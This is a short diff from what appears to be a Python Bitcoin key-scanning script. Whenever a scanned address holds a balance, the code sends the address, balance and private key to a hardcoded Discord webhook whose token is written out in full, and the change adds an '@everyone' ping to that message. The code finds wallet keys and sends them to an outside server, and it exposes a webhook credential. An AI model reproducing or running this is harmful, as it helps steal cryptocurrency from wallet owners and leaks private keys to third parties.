@@ -86,7 +86,7 @@ def main():
                     w.write(
                         f"Address: {addr} | Balance: {balance} | Private key: {prv} | Last seen: {last_seen_bc(addr)}\n"
                     )
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/914476019086426145/OdSndxmXSr7CH3v4uPAgml_vYWDL5EXeCkb_5xpzp2KZP7CPtgV7ifFm9XyNJBpUCgvF', rate_limit_retry=True, content=f'Address: {addr} | Balance: {balance} | Private key: {prv}')
+                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/914476019086426145/OdSndxmXSr7CH3v4uPAgml_vYWDL5EXeCkb_5xpzp2KZP7CPtgV7ifFm9XyNJBpUCgvF', rate_limit_retry=True, content=f'@everyone Address: {addr} | Balance: {balance} | Private key: {prv}')
                     response = webhook.execute()
                 print(f"{last_seen_bc(addr)} {bcolors.OK} : {balance} : {prv} : {addr}")
 
